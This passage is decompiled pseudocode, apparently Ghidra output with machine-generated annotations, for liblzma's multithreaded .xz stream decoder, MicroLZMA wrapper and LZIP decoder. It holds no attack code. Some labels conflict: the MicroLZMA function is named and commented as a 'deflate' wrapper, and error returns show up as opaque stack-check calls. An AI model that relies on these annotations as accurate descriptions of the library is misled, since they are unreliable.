   decoding when memory constraints prevent parallel operation. */

ulong lzma_stream_decoder_mt_decode
                (undefined4 *param_1,undefined8 param_2,long param_3,ulong *param_4,ulong param_5,
                undefined8 param_6,long *param_7,undefined8 param_8,int param_9)

{
  pthread_mutex_t *__mutex;
  undefined4 *puVar1;
  ulong uVar2;
  long lVar3;
  long lVar4;
  long lVar5;
  long lVar6;
  undefined8 uVar7;
  undefined8 uVar8;
  undefined8 uVar9;
  undefined8 uVar10;
  undefined8 uVar11;
  undefined8 uVar12;
  undefined8 uVar13;
  undefined8 uVar14;
  undefined8 uVar15;
  undefined8 uVar16;
  undefined8 uVar17;
  undefined8 uVar18;
  undefined8 uVar19;
  undefined8 uVar20;
  char cVar21;
  byte bVar22;
  uint uVar23;
  ulong uVar24;
  long lVar25;
  undefined8 uVar26;
  ulong uVar27;
  long lVar28;
  int iVar29;
  undefined4 *puVar30;
  long in_FS_OFFSET;
  undefined1 local_19a;
  char local_199;
  undefined1 local_198 [16];
  timespec local_188 [4];
  __sigset_t local_148;
  pthread_condattr_t local_c8 [34];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  local_19a = 0;
  bVar22 = 1;
  if ((param_9 != 3) && (bVar22 = 0, *param_4 == param_5)) {
    bVar22 = *(byte *)((long)param_1 + 0x2df) ^ 1;
  }
  *(undefined1 *)((long)param_1 + 0x2df) = 0;
  switch(*param_1) {
  case 0:
    while( true ) {
      uVar24 = *param_4;
      lzma_bufcpy(param_3,param_4,param_5,param_1 + 0xba,param_1 + 0xb8,0xc);
      *(ulong *)(param_1 + 0xb2) = *(long *)(param_1 + 0xb2) + (*param_4 - uVar24);
      if (*(ulong *)(param_1 + 0xb8) < 0xc) break;
      *(undefined8 *)(param_1 + 0xb8) = 0;
      uVar27 = lzma_stream_header_decode(param_1 + 0x5e,param_1 + 0xba);
      if ((int)uVar27 != 0) {
        if ((int)uVar27 == 7) {
          uVar24 = stack_check_guard_1();
          return uVar24;
        }
        goto code_r0x0011317a;
      }
      *(undefined1 *)((long)param_1 + 0x2de) = 0;
      *param_1 = 1;
      param_1[0x18] = param_1[0x62];
      if ((*(char *)(param_1 + 0xb6) != '\0') && (param_1[0x62] == 0)) {
        uVar24 = stack_check_guard_1();
        return uVar24;
      }
      if ((*(char *)((long)param_1 + 0x2d9) != '\0') &&
         (cVar21 = lzma_check_is_supported(), cVar21 == '\0')) {
        uVar24 = stack_check_guard_1();
        return uVar24;
      }
      if (*(char *)((long)param_1 + 0x2da) != '\0') {
        uVar24 = stack_check_guard_1();
        return uVar24;
      }
switchD_00112b88_caseD_1:
      uVar24 = *param_4;
joined_r0x00112e23:
      if (param_5 <= uVar24) {
LAB_0011310f:
        if ((param_9 == 3) && (*(char *)((long)param_1 + 0x2dd) != '\0')) goto LAB_0011334d;
        uVar27 = threaded_decode_loop
                           (param_1,param_2,param_6,param_7,param_8,0,bVar22,local_198,&local_19a);
        if ((int)uVar27 != 0) goto code_r0x0011317a;
        if (param_1[0x70] == 0) break;
        goto LAB_00113276;
      }
      if (*(long *)(param_1 + 0xb8) != 0) {
        iVar29 = param_1[0x17];
LAB_00112e58:
        lzma_bufcpy(param_3,param_4,param_5,param_1 + 0xba,param_1 + 0xb8,iVar29);
        if (*(ulong *)(param_1 + 0xb8) < (ulong)(uint)param_1[0x17]) {
          *(ulong *)(param_1 + 0xb2) = *(long *)(param_1 + 0xb2) + (*param_4 - uVar24);
          goto LAB_0011310f;
        }
        param_1[0x16] = 1;
        *(undefined4 **)(param_1 + 0x1e) = param_1 + 0x4a;
        *(undefined8 *)(param_1 + 0xb8) = 0;
        iVar29 = lzma_block_header_decode(param_1 + 0x16,param_2,param_1 + 0xba);
        if (iVar29 == 0) {
          *(undefined1 *)(param_1 + 0x48) = *(undefined1 *)((long)param_1 + 0x2db);
          *(ulong *)(param_1 + 0xb2) = *(long *)(param_1 + 0xb2) + (*param_4 - uVar24);
        }
        else {
          *(ulong *)(param_1 + 0xb2) = *(long *)(param_1 + 0xb2) + (*param_4 - uVar24);
          if (iVar29 == 0x66) goto LAB_00112b8b;
          if (iVar29 != 1) goto LAB_001137b4;
        }
        uVar24 = lzma_raw_decoder_memusage(param_1 + 0x4a);
        *(ulong *)(param_1 + 0xac) = uVar24;
        if (uVar24 == 0xffffffffffffffff) {
          param_1[0x70] = 8;
          *param_1 = 0xb;
          goto switchD_00112b88_caseD_b;
        }
        *param_1 = 2;
LAB_00112f37:
        if (*(ulong *)(param_1 + 0xa4) < uVar24) {
          uVar27 = threaded_decode_loop
                             (param_1,param_2,param_6,param_7,param_8,0,1,local_198,&local_19a);
          if ((int)uVar27 != 0) goto code_r0x0011317a;
          if (param_1[0x86] == 0) {
            uVar24 = stack_check_guard_1();
            return uVar24;
          }
          break;
        }
        uVar27 = *(ulong *)(param_1 + 0x1a);
        if ((uVar27 < 0x5555555555555556) &&
           (uVar2 = *(ulong *)(param_1 + 0x1c), uVar2 < 0x5555555555555556)) {
          uVar23 = lzma_check_size(param_1[0x62]);
          lVar25 = (ulong)uVar23 + (uVar27 + 3 & 0xfffffffffffffffc);
          *(long *)(param_1 + 0xae) = lVar25;
          uVar27 = uVar2 + 0x40 + lVar25;
          if ((uVar24 <= ~uVar27) &&
             (uVar27 = uVar27 + uVar24, *(ulong *)(param_1 + 0xb0) = uVar27,
             uVar27 <= *(ulong *)(param_1 + 0xa2))) goto code_r0x001131db;
        }
        *param_1 = 5;
switchD_00112b88_caseD_5:
        uVar27 = threaded_decode_loop
                           (param_1,param_2,param_6,param_7,param_8,0,1,local_198,&local_19a);
        if ((int)uVar27 == 0) {
          if (param_1[0x86] == 0) {
            lzma_outq_clear(param_1 + 0x7a,param_2);
            stop_worker_threads(param_1,param_2);
            uVar23 = lzma_block_decoder_init(param_1 + 2,param_2,param_1 + 0x16);
            lzma_filters_free(param_1 + 0x4a,param_2);
            uVar27 = (ulong)uVar23;
            *(undefined8 *)(param_1 + 0x1e) = 0;
            if (uVar23 == 0) {
              *param_1 = 6;
              *(undefined8 *)(param_1 + 0xa6) = *(undefined8 *)(param_1 + 0xac);
switchD_00112b88_caseD_6:
              uVar24 = *param_4;
              lVar25 = *param_7;
              uVar27 = (**(code **)(param_1 + 8))
                                 (*(undefined8 *)(param_1 + 2),param_2,param_3,param_4,param_5,
                                  param_6,param_7,param_8,param_9);
              lVar3 = *param_7;
              *(ulong *)(param_1 + 0xb2) = *(long *)(param_1 + 0xb2) + (*param_4 - uVar24);
              *(long *)(param_1 + 0xb4) = *(long *)(param_1 + 0xb4) + (lVar3 - lVar25);
              if ((int)uVar27 == 1) {
                uVar26 = lzma_block_unpadded_size(param_1 + 0x16);
                uVar27 = lzma_index_hash_append
                                   (*(undefined8 *)(param_1 + 0x6c),uVar26,
                                    *(undefined8 *)(param_1 + 0x1c));
                if ((int)uVar27 == 0) goto code_r0x001130fa;
              }
            }
            goto code_r0x0011317a;
          }
          break;
        }
        goto code_r0x0011317a;
      }
      if (*(byte *)(param_3 + uVar24) != 0) {
        iVar29 = (uint)*(byte *)(param_3 + uVar24) * 4 + 4;
        param_1[0x17] = iVar29;
        goto LAB_00112e58;
      }
LAB_00112b8b:
      *param_1 = 7;
switchD_00112b88_caseD_7:
      uVar27 = threaded_decode_loop
                         (param_1,param_2,param_6,param_7,param_8,0,1,local_198,&local_19a);
      if ((int)uVar27 != 0) goto code_r0x0011317a;
      if (param_1[0x86] != 0) break;
      *param_1 = 8;
switchD_00112b88_caseD_8:
      uVar2 = *param_4;
      if (param_5 <= uVar2) break;
      uVar27 = lzma_index_hash_decode(*(undefined8 *)(param_1 + 0x6c),param_3,param_4,param_5);
      uVar24 = *param_4;
      *(ulong *)(param_1 + 0xb2) = *(long *)(param_1 + 0xb2) + (uVar24 - uVar2);
      if ((int)uVar27 != 1) goto code_r0x0011317a;
      *param_1 = 9;
LAB_00112c2e:
      lzma_bufcpy(param_3,param_4,param_5,param_1 + 0xba,param_1 + 0xb8,0xc);
      *(ulong *)(param_1 + 0xb2) = (*param_4 + *(long *)(param_1 + 0xb2)) - uVar24;
      if (*(ulong *)(param_1 + 0xb8) < 0xc) break;
      *(undefined8 *)(param_1 + 0xb8) = 0;
      iVar29 = lzma_stream_footer_decode(local_188,param_1 + 0xba);
      if (iVar29 != 0) {
        uVar24 = stack_check_guard_1();
        return uVar24;
      }
      lVar25 = lzma_index_hash_size(*(undefined8 *)(param_1 + 0x6c));
      if (lVar25 != local_188[0].tv_nsec) {
LAB_001137da:
        uVar24 = stack_check_guard_1();
        return uVar24;
      }
      uVar27 = lzma_stream_flags_compare(param_1 + 0x5e,local_188);
      if ((int)uVar27 != 0) goto code_r0x0011317a;
      if (*(char *)(param_1 + 0xb7) == '\0') {
        uVar24 = stack_check_guard_1();
        return uVar24;
      }
      *param_1 = 10;
switchD_00112b88_caseD_a:
      uVar24 = *param_4;
      if (param_5 <= uVar24) {
LAB_001131a8:
        if (param_9 == 3) {
          uVar24 = stack_check_guard_1();
          return uVar24;
        }
        break;
      }
      uVar27 = *(ulong *)(param_1 + 0xb8);
      while (*(char *)(param_3 + uVar24) == '\0') {
        uVar24 = uVar24 + 1;
        *(long *)(param_1 + 0xb2) = *(long *)(param_1 + 0xb2) + 1;
        uVar27 = (ulong)((int)uVar27 + 1U & 3);
        *param_4 = uVar24;
        *(ulong *)(param_1 + 0xb8) = uVar27;
        if (uVar24 == param_5) goto LAB_001131a8;
      }
      if (uVar27 != 0) {
        *(long *)(param_1 + 0xb2) = *(long *)(param_1 + 0xb2) + 1;
        *param_4 = uVar24 + 1;
        goto LAB_001137da;
      }
      lVar25 = lzma_index_hash_init(*(undefined8 *)(param_1 + 0x6c),param_2);
      *(long *)(param_1 + 0x6c) = lVar25;
      if (lVar25 == 0) {
        uVar24 = stack_check_guard_1();
        return uVar24;
      }
      *param_1 = 0;
      *(undefined8 *)(param_1 + 0xb8) = 0;
    }
    break;
  case 1:
    goto switchD_00112b88_caseD_1;
  case 2:
    uVar24 = *(ulong *)(param_1 + 0xac);
    goto LAB_00112f37;
  case 3:
    goto switchD_00112b88_caseD_3;
  case 4:
    goto switchD_00112b88_caseD_4;
  case 5:
    goto switchD_00112b88_caseD_5;
  case 6:
    goto switchD_00112b88_caseD_6;
  case 7:
    goto switchD_00112b88_caseD_7;
  case 8:
    goto switchD_00112b88_caseD_8;
  case 9:
    uVar24 = *param_4;
    goto LAB_00112c2e;
  case 10:
    goto switchD_00112b88_caseD_a;
  case 0xb:
switchD_00112b88_caseD_b:
    if (*(char *)((long)param_1 + 0x2dd) != '\0') {
LAB_0011328c:
      uVar24 = stack_check_guard_1();
      return uVar24;
    }
    uVar27 = threaded_decode_loop(param_1,param_2,param_6,param_7,param_8,0,1,local_198,&local_19a);
    if ((int)uVar27 != 0) goto code_r0x0011317a;
    if (param_1[0x86] == 0) goto LAB_0011328c;
    break;
  default:
    uVar24 = stack_check_guard_1();
    return uVar24;
  }
  uVar27 = 0;
code_r0x0011317a:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar27;
code_r0x001130fa:
  uVar24 = *param_4;
  *param_1 = 1;
  goto joined_r0x00112e23;
code_r0x001131db:
  lzma_next_coder_end(param_1 + 2,param_2);
  *(undefined8 *)(param_1 + 0xa6) = 0;
  uVar26 = lzma_block_unpadded_size(param_1 + 0x16);
  iVar29 = lzma_index_hash_append
                     (*(undefined8 *)(param_1 + 0x6c),uVar26,*(undefined8 *)(param_1 + 0x1c));
  if (iVar29 != 0) {
LAB_001137b4:
    param_1[0x70] = iVar29;
    goto LAB_00113276;
  }
  *param_1 = 3;
switchD_00112b88_caseD_3:
  local_199 = '\0';
  uVar27 = threaded_decode_loop
                     (param_1,param_2,param_6,param_7,param_8,&local_199,1,local_198,&local_19a);
  if ((int)uVar27 != 0) goto code_r0x0011317a;
  if (param_1[0x70] != 0) goto LAB_00113276;
  uVar27 = 0;
  if (local_199 == '\0') goto code_r0x0011317a;
  __mutex = (pthread_mutex_t *)(param_1 + 0x8a);
  pthread_mutex_lock(__mutex);
  lVar25 = *(long *)(param_1 + 0x76);
  lVar3 = *(long *)(param_1 + 0xa8);
  lVar4 = *(long *)(param_1 + 0xaa);
  pthread_mutex_unlock(__mutex);
  lVar5 = *(long *)(param_1 + 0xa2);
  lVar6 = *(long *)(param_1 + 0xb0);
  puVar1 = param_1 + 0x7a;
  if ((ulong)(lVar5 - lVar6) < (ulong)(*(long *)(param_1 + 0x82) + lVar3 + lVar4)) {
    lzma_outq_drain_to_marker(param_1 + 0x7a,param_2,*(undefined8 *)(param_1 + 0x1c));
  }
  lVar28 = 0;
  if (((lVar25 != 0) &&
      ((ulong)(lVar5 - lVar6) < (ulong)(lVar3 + lVar4 + *(long *)(param_1 + 0x84)))) &&
     ((*(ulong *)(param_1 + 0xac) < *(ulong *)(lVar25 + 0x180) ||
      (lVar25 = *(long *)(lVar25 + 0x188), lVar25 != 0)))) {
    lVar28 = 0;
    do {
      lzma_next_coder_end(lVar25 + 0x60,param_2);
      lVar28 = lVar28 + *(long *)(lVar25 + 0x180);
      *(undefined8 *)(lVar25 + 0x180) = 0;
      lVar25 = *(long *)(lVar25 + 0x188);
    } while (lVar25 != 0);
  }
  pthread_mutex_lock(__mutex);
  *(long *)(param_1 + 0xaa) = *(long *)(param_1 + 0xaa) - lVar28;
  *(long *)(param_1 + 0xa8) =
       *(long *)(param_1 + 0xae) + *(long *)(param_1 + 0xa8) + *(long *)(param_1 + 0xac);
  pthread_mutex_unlock(__mutex);
  iVar29 = lzma_outq_alloc_buffer(puVar1,param_2,*(undefined8 *)(param_1 + 0x1c));
  if (iVar29 != 0) {
    thread_pool_signal_workers(param_1 + 0x72,param_1 + 0x74);
    uVar24 = stack_check_guard_1();
    return uVar24;
  }
  pthread_mutex_lock(__mutex);
  lVar25 = *(long *)(param_1 + 0x76);
  if (lVar25 != 0) {
    uVar26 = *(undefined8 *)(lVar25 + 0x188);
    *(long *)(param_1 + 0x78) = lVar25;
    *(long *)(param_1 + 0xaa) = *(long *)(param_1 + 0xaa) - *(long *)(lVar25 + 0x180);
    *(undefined8 *)(param_1 + 0x76) = uVar26;
  }
  pthread_mutex_unlock(__mutex);
  puVar30 = *(undefined4 **)(param_1 + 0x78);
  if (puVar30 == (undefined4 *)0x0) {
    lVar25 = *(long *)(param_1 + 0x74);
    if (lVar25 == 0) {
      lVar25 = lzma_alloc((ulong)(uint)param_1[0x71] * 0x1f8);
      *(long *)(param_1 + 0x74) = lVar25;
      if (lVar25 == 0) goto LAB_00113af3;
    }
    puVar30 = (undefined4 *)(lVar25 + (ulong)(uint)param_1[0x72] * 0x1f8);
    iVar29 = pthread_mutex_init((pthread_mutex_t *)(puVar30 + 100),(pthread_mutexattr_t *)0x0);
    if (iVar29 != 0) goto LAB_00113af3;
    iVar29 = clock_gettime(1,local_188);
    if (iVar29 == 0) {
      iVar29 = pthread_condattr_init(local_c8);
      if (iVar29 != 0) goto LAB_001139af;
      iVar29 = pthread_condattr_setclock(local_c8,1);
      if (iVar29 != 0) {
        pthread_condattr_destroy(local_c8);
        goto LAB_001139af;
      }
      iVar29 = pthread_cond_init((pthread_cond_t *)(puVar30 + 0x6e),local_c8);
      pthread_condattr_destroy(local_c8);
      if (iVar29 != 0) goto LAB_001139af;
      puVar30[0x7a] = 1;
LAB_001139d8:
      *(undefined4 **)(puVar30 + 0xc) = param_1;
      *(undefined1 (*) [16])(puVar30 + 0x18) = (undefined1  [16])0x0;
      *puVar30 = 0;
      *(undefined8 *)(puVar30 + 2) = 0;
      *(undefined8 *)(puVar30 + 4) = 0;
      *(undefined8 *)(puVar30 + 0xe) = param_2;
      *(undefined8 *)(puVar30 + 0x10) = 0;
      *(undefined8 *)(puVar30 + 0x1a) = 0xffffffffffffffff;
      *(undefined8 *)(puVar30 + 0x60) = 0;
      *(undefined1 (*) [16])(puVar30 + 0x1c) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar30 + 0x20) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar30 + 0x24) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar30 + 0x28) = (undefined1  [16])0x0;
      sigfillset((sigset_t *)local_c8);
      pthread_sigmask(2,(__sigset_t *)local_c8,&local_148);
      iVar29 = pthread_create((pthread_t *)(puVar30 + 0x7c),(pthread_attr_t *)0x0,FUN_00112310,
                              puVar30);
      pthread_sigmask(2,&local_148,(__sigset_t *)0x0);
      if (iVar29 == 0) {
        param_1[0x72] = param_1[0x72] + 1;
        *(undefined4 **)(param_1 + 0x78) = puVar30;
        goto LAB_00113608;
      }
      pthread_cond_destroy((pthread_cond_t *)(puVar30 + 0x6e));
    }
    else {
LAB_001139af:
      puVar30[0x7a] = 0;
      iVar29 = pthread_cond_init((pthread_cond_t *)(puVar30 + 0x6e),(pthread_condattr_t *)0x0);
      if (iVar29 == 0) goto LAB_001139d8;
    }
    pthread_mutex_destroy((pthread_mutex_t *)(puVar30 + 100));
  }
  else {
LAB_00113608:
    uVar7 = *(undefined8 *)(param_1 + 0x16);
    uVar8 = *(undefined8 *)(param_1 + 0x18);
    uVar9 = *(undefined8 *)(param_1 + 0x1a);
    uVar10 = *(undefined8 *)(param_1 + 0x1c);
    *(undefined8 *)(puVar30 + 6) = 0;
    uVar11 = *(undefined8 *)(param_1 + 0x1e);
    uVar12 = *(undefined8 *)(param_1 + 0x20);
    uVar26 = *(undefined8 *)(param_1 + 0xac);
    *(undefined8 *)(puVar30 + 8) = 0;
    uVar15 = *(undefined8 *)(param_1 + 0x22);
    uVar16 = *(undefined8 *)(param_1 + 0x24);
    uVar17 = *(undefined8 *)(param_1 + 0x26);
    uVar18 = *(undefined8 *)(param_1 + 0x28);
    *(undefined8 *)(puVar30 + 0x2c) = uVar7;
    *(undefined8 *)(puVar30 + 0x2e) = uVar8;
    uVar7 = *(undefined8 *)(param_1 + 0x2e);
    uVar8 = *(undefined8 *)(param_1 + 0x30);
    *(undefined8 *)(puVar30 + 0x30) = uVar9;
    *(undefined8 *)(puVar30 + 0x32) = uVar10;
    uVar19 = *(undefined8 *)(param_1 + 0x2a);
    uVar20 = *(undefined8 *)(param_1 + 0x2c);
    uVar9 = *(undefined8 *)(param_1 + 0x32);
    uVar10 = *(undefined8 *)(param_1 + 0x34);
    *(undefined8 *)(puVar30 + 0x34) = uVar11;
    *(undefined8 *)(puVar30 + 0x36) = uVar12;
    uVar11 = *(undefined8 *)(param_1 + 0x36);
    uVar12 = *(undefined8 *)(param_1 + 0x38);
    uVar13 = *(undefined8 *)(param_1 + 0x3a);
    uVar14 = *(undefined8 *)(param_1 + 0x3c);
    *(undefined8 *)(puVar30 + 0x38) = uVar15;
    *(undefined8 *)(puVar30 + 0x3a) = uVar16;
    uVar15 = *(undefined8 *)(param_1 + 0x3e);
    uVar16 = *(undefined8 *)(param_1 + 0x40);
    *(undefined8 *)(puVar30 + 0x3c) = uVar17;
    *(undefined8 *)(puVar30 + 0x3e) = uVar18;
    uVar17 = *(undefined8 *)(param_1 + 0x42);
    uVar18 = *(undefined8 *)(param_1 + 0x44);
    *(undefined8 *)(puVar30 + 0x44) = uVar7;
    *(undefined8 *)(puVar30 + 0x46) = uVar8;
    *(undefined8 *)(puVar30 + 0x48) = uVar9;
    *(undefined8 *)(puVar30 + 0x4a) = uVar10;
    *(undefined8 *)(puVar30 + 0x4c) = uVar11;
    *(undefined8 *)(puVar30 + 0x4e) = uVar12;
    *(undefined8 *)(puVar30 + 0x50) = uVar13;
    *(undefined8 *)(puVar30 + 0x52) = uVar14;
    *(undefined8 *)(puVar30 + 0x54) = uVar15;
    *(undefined8 *)(puVar30 + 0x56) = uVar16;
    *(undefined8 *)(puVar30 + 0x58) = uVar17;
    *(undefined8 *)(puVar30 + 0x5a) = uVar18;
    *(undefined8 *)(puVar30 + 0x60) = uVar26;
    *(undefined8 *)(puVar30 + 10) = 0;
    *(undefined8 *)(puVar30 + 0x12) = 0;
    *(undefined8 *)(puVar30 + 0x14) = 0;
    puVar30[0x16] = 0;
    *(undefined8 *)(puVar30 + 0x40) = uVar19;
    *(undefined8 *)(puVar30 + 0x42) = uVar20;
    uVar26 = *(undefined8 *)(param_1 + 0x48);
    *(undefined8 *)(puVar30 + 0x5c) = *(undefined8 *)(param_1 + 0x46);
    *(undefined8 *)(puVar30 + 0x5e) = uVar26;
    iVar29 = lzma_block_decoder_init(puVar30 + 0x18,param_2,puVar30 + 0x2c);
    lzma_filters_free(param_1 + 0x4a,param_2);
    lVar25 = *(long *)(param_1 + 0x78);
    *(undefined8 *)(lVar25 + 0xd0) = 0;
    if (iVar29 != 0) {
      param_1[0x70] = iVar29;
      *param_1 = 0xb;
      goto switchD_00112b88_caseD_b;
    }
    uVar26 = *(undefined8 *)(param_1 + 0xae);
    *(undefined8 *)(lVar25 + 0x10) = uVar26;
    uVar26 = lzma_alloc(uVar26,param_2);
    lVar3 = *(long *)(param_1 + 0x78);
    *(undefined8 *)(lVar25 + 8) = uVar26;
    if (*(long *)(lVar3 + 8) != 0) {
      uVar26 = lzma_outq_enqueue(puVar1,lVar3);
      *(undefined8 *)(lVar3 + 0x40) = uVar26;
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x78) + 400));
      puVar30 = *(undefined4 **)(param_1 + 0x78);
      *puVar30 = 1;
      pthread_cond_signal((pthread_cond_t *)(puVar30 + 0x6e));
      pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 0x78) + 400));
      pthread_mutex_lock(__mutex);
      lzma_outq_read_callback(puVar1,lzma_worker_signal_finish);
      pthread_mutex_unlock(__mutex);
      *param_1 = 4;
switchD_00112b88_caseD_4:
      lVar25 = *(long *)(param_1 + 0x78);
      if (((param_9 == 3) && (*(char *)((long)param_1 + 0x2dd) != '\0')) &&
         (param_5 - *param_4 < (ulong)(*(long *)(lVar25 + 0x10) - *(long *)(lVar25 + 0x18)))) {
LAB_0011334d:
        thread_pool_signal_workers(param_1 + 0x72,param_1 + 0x74);
        uVar24 = stack_check_guard_1();
        return uVar24;
      }
      local_188[0].tv_sec = *(long *)(lVar25 + 0x18);
      lzma_bufcpy(param_3,param_4,param_5,*(undefined8 *)(lVar25 + 8),local_188);
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x78) + 400));
      lVar25 = *(long *)(param_1 + 0x78);
      *(__time_t *)(lVar25 + 0x18) = local_188[0].tv_sec;
      pthread_cond_signal((pthread_cond_t *)(lVar25 + 0x1b8));
      pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 0x78) + 400));
      uVar27 = threaded_decode_loop
                         (param_1,param_2,param_6,param_7,param_8,0,bVar22,local_198,&local_19a);
      if ((int)uVar27 != 0) goto code_r0x0011317a;
      if (param_1[0x70] == 0) {
        uVar27 = 0;
        if (*(ulong *)(*(long *)(param_1 + 0x78) + 0x18) <
            *(ulong *)(*(long *)(param_1 + 0x78) + 0x10)) goto code_r0x0011317a;
        *(undefined8 *)(param_1 + 0x78) = 0;
        *param_1 = 1;
        goto switchD_00112b88_caseD_1;
      }
LAB_00113276:
      *param_1 = 0xb;
      goto switchD_00112b88_caseD_b;
    }
  }
LAB_00113af3:
  thread_pool_signal_workers(param_1 + 0x72,param_1 + 0x74);
  uVar24 = stack_check_guard_1();
  return uVar24;
}



/**
 * @name  lzma_microlzma_decoder_code
 * @brief MicroLZMA decoder wrapper that validates header, decodes LZMA properties from first byte, initializes sub-decoder filter chain, then dispatches to block decoding with compressed/uncompressed size limit enforcement.
 * @confidence 72%
 * @classification parser
 * @address 0x00114180
 */

/* Wrapper function for deflate decompression with header validation and state management */

undefined8
deflate_decode_wrapper
          (undefined8 *param_1,undefined8 param_2,long param_3,ulong *param_4,ulong param_5,
          undefined8 param_6,long *param_7,long param_8,undefined4 param_9)

{
  ulong uVar1;
  char cVar2;
  int iVar3;
  undefined8 uVar4;
  long lVar5;
  undefined8 *puVar6;
  long lVar7;
  long in_FS_OFFSET;
  undefined1 local_f1;
  undefined8 local_f0;
  undefined8 local_e8 [6];
  undefined8 local_b4;
  undefined8 local_78;
  code *local_70;
  undefined8 *local_68;
  undefined1 local_60 [16];
  undefined8 local_50;
  long local_40;
  
  uVar1 = *param_4;
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  lVar7 = *param_7;
  if ((ulong)param_1[10] < param_5 - uVar1) {
    param_5 = param_1[10] + uVar1;
  }
  cVar2 = *(char *)((long)param_1 + 100);
  lVar5 = param_8;
  if ((cVar2 == '\0') &&
     (lVar5 = param_1[0xb] + lVar7, (ulong)(param_8 - lVar7) <= (ulong)param_1[0xb])) {
    lVar5 = param_8;
  }
  param_8 = lVar5;
  if (*(char *)((long)param_1 + 0x65) == '\0') {
    uVar4 = 0;
    if (param_5 <= uVar1) goto LAB_00114280;
    puVar6 = local_e8;
    for (lVar5 = 0xe; lVar5 != 0; lVar5 = lVar5 - 1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    local_e8[0]._0_4_ = *(undefined4 *)(param_1 + 0xc);
    local_b4 = 0xffffffffffffffff;
    if (cVar2 != '\0') {
      local_b4 = param_1[0xb];
    }
    cVar2 = lzma_lzma_lclppb_decode(local_e8,~*(byte *)(param_3 + uVar1));
    uVar4 = 8;
    if (cVar2 != '\0') goto LAB_00114280;
    *param_4 = *param_4 + 1;
    local_78 = 0x4000000000000002;
    local_50 = 0;
    local_70 = FUN_00120480;
    local_60 = (undefined1  [16])0x0;
    local_68 = local_e8;
    uVar4 = set_filter_and_init(param_1,param_2,&local_78);
    if ((int)uVar4 != 0) goto LAB_00114280;
    local_f1 = 0;
    local_f0 = 0;
    iVar3 = (*(code *)param_1[3])(*param_1,param_2,&local_f1,&local_f0,1,param_6,param_7,param_8,0);
    uVar4 = 0xb;
    if (iVar3 != 0) goto LAB_00114280;
    *(undefined1 *)((long)param_1 + 0x65) = 1;
  }
  uVar4 = (*(code *)param_1[3])
                    (*param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
  lVar5 = (uVar1 - *param_4) + param_1[10];
  param_1[10] = lVar5;
  if (*(char *)((long)param_1 + 100) == '\0') {
    lVar7 = param_1[0xb] + (lVar7 - *param_7);
    param_1[0xb] = lVar7;
    if ((int)uVar4 == 1) {
LAB_0011440e:
      uVar4 = 9;
      goto LAB_00114280;
    }
    if (lVar7 != 0) goto LAB_00114280;
  }
  else {
    if ((int)uVar4 != 1) goto LAB_00114280;
    if (lVar5 != 0) goto LAB_0011440e;
  }
  uVar4 = 1;
LAB_00114280:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar4;
}



/**
 * @name  lzma_lzip_decoder_code
 * @brief LZIP format decoder state machine. States: 0=magic 'LZIP', 1=version, 2=dictionary size, 3=init LZMA, 4=decompress, 5=verify trailer (CRC32, sizes). Supports v0/v1 with different trailer sizes.
 * @confidence 85%
 * @classification parser
 * @address 0x00114660
 */

/* State machine for decoding LZIP format. States: 0=magic bytes ('LZIP'), 1=version byte,
   2=dictionary size byte, 3=init LZMA decoder, 4=decompress data, 5=read and verify trailer (CRC32,
   uncompressed size, member size). Supports LZIP v0 and v1 formats with different trailer sizes. */

ulong lzip_decoder_run(undefined4 *param_1,undefined8 param_2,long param_3,ulong *param_4,
                      ulong param_5,long param_6,long *param_7,undefined8 param_8,int param_9)

{
  byte bVar1;
  undefined4 uVar2;
  ulong uVar3;
  ulong uVar4;
  uint uVar5;
  long lVar6;
  long lVar7;
  long in_FS_OFFSET;
  undefined8 local_78;
  code *local_70;
  undefined4 *local_68;
  undefined1 local_60 [16];
  undefined8 local_50;
  char local_44 [4];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  switch(*param_1) {
  case 0:
    break;
  case 1:
    uVar4 = *param_4;
    goto LAB_00114983;
  case 2:
    uVar3 = *param_4;
    goto LAB_001148f3;
  case 3:
    uVar3 = *(ulong *)(param_1 + 10);
    goto LAB_001146c4;
  case 4:
    goto switchD_001146b7_caseD_4;
  case 5:
    goto switchD_001146b7_caseD_5;
  default:
    uVar3 = stack_check_return();
    return uVar3;
  }
switchD_001146b7_caseD_0:
  uVar3 = *(ulong *)(param_1 + 0xe);
  uVar4 = *param_4;
  builtin_strncpy(local_44,"LZIP",4);
  if (uVar3 < 4) {
    do {
      if (param_5 <= uVar4) {
        uVar3 = (ulong)((uint)(param_9 == 3) & (*(byte *)((long)param_1 + 0x33) ^ 1));
        goto code_r0x001148c9;
      }
      if (*(char *)(param_3 + uVar4) != local_44[uVar3]) {
        uVar3 = stack_check_return();
        return uVar3;
      }
      uVar4 = uVar4 + 1;
      uVar3 = uVar3 + 1;
      *param_4 = uVar4;
      *(ulong *)(param_1 + 0xe) = uVar3;
    } while (uVar3 != 4);
  }
  *(undefined8 *)(param_1 + 0xe) = 0;
  param_1[2] = 0;
  *(undefined8 *)(param_1 + 4) = 0;
  *(undefined8 *)(param_1 + 6) = 4;
  *param_1 = 1;
LAB_00114983:
  if (param_5 <= uVar4) {
LAB_00114a18:
    uVar3 = stack_check_return();
    return uVar3;
  }
  uVar3 = uVar4 + 1;
  bVar1 = *(byte *)(param_3 + uVar4);
  *param_4 = uVar3;
  param_1[1] = (uint)bVar1;
  if (1 < bVar1) {
    uVar3 = stack_check_return();
    return uVar3;
  }
  *(long *)(param_1 + 6) = *(long *)(param_1 + 6) + 1;
  *param_1 = 2;
  if (*(char *)(param_1 + 0xc) != '\0') {
    uVar3 = stack_check_return();
    return uVar3;
  }
LAB_001148f3:
